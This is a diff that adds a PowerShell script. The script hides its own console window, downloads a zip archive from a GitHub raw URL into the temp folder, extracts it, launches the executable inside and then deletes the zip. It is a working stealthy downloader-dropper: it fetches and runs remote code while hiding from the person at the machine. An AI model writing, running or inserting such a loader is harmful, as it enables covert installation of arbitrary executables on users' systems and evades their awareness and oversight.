@@ -1,0 +1,44 @@
+# Hide PowerShell Console Window
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+}
+"@
+$consolePtr = [Win32]::GetConsoleWindow()
+[Win32]::ShowWindow($consolePtr, 0)  # Hide the console window
+
+# Define the download and extraction parameters
+$url = "https://github.com/pisusaoonasalex/msgbox/raw/refs/heads/main/installer.zip" # Replace with your zip file URL
+$zipPath = Join-Path $env:TEMP 'downloaded.zip'
+$extractPath = Join-Path $env:TEMP 'extracted'
+$exeName = "msgbox.exe" # Name of the executable inside the zip
+
+try {
+    # Download the zip file
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $zipPath)
+
+    # Extract the zip file
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
+
+    # Run the executable
+    $exePath = Join-Path -Path $extractPath -ChildPath $exeName
+    if (Test-Path $exePath) {
+        Start-Process -FilePath $exePath -NoNewWindow
+    } else {
+        Write-Output "Executable not found at $exePath"
+    }
+} catch {
+    Write-Output "An error occurred: $_"
+} finally {
+    # Clean up downloaded zip file (optional)
+    if (Test-Path $zipPath) {
+        Remove-Item $zipPath -Force
+    }
+}
